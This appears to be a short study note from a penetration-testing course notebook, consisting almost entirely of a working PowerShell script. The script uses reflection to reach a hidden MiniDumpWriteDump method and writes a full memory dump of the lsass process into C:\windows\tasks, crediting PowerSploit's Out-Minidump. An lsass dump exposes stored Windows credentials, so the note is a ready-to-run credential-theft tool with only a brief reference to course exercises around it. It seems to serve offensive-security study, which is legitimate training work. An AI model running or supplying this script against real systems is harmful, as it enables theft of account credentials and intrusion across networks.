```c#
$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
$Flags = [Reflection.BindingFlags] 'NonPublic, Static'
$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
$MiniDumpWithFullMemory = [UInt32] 2

$Process = Get-Process -Name "lsass"
$DumpFilePath = "C:\windows\tasks"
$ProcessId = $Process.Id
$ProcessName = $Process.Name
$ProcessHandle = $Process.Handle
$ProcessFileName = "$($ProcessName)_$($ProcessId).dmp"

$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName

$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)

$Result = $MiniDumpWriteDump.Invoke($null,@($ProcessHandle,$ProcessId,$FileStream.SafeFileHandle,$MiniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))

$FileStream.Close()
```

Kudos: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1

More Info: [[Evasion Techniques and Breaching Defenses#12 4 2 1 Exercises]]